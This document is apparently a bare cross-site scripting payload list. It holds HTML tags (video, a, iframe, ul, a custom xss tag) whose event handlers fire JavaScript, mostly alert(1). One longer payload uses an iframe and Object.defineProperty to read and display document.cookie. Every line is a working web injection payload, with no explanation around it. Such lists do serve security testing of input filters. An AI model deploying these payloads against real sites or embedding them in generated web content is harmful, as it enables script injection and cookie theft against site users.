<video onloadstart=alert(1)><source>
<video><source onerror=alert(1) src=1></video>
<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
<a onmouseenter="alert(1)">test</a>
<a onmousehover="alert(1)">test</a>
<a onmouseout="alert(1)">test</a>
<a onmouseover="alert(1)">test</a>
<a onmouseleave="alert(1)">test</a>
<a onmousemove="alert(1)">test</a>
<a onmouseup="alert(1)">test</a>
<xss   onfocusout=alert(1)></xss><input autofocus>
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
<ul onbeforecopy="alert(1)" contenteditable>test</ul>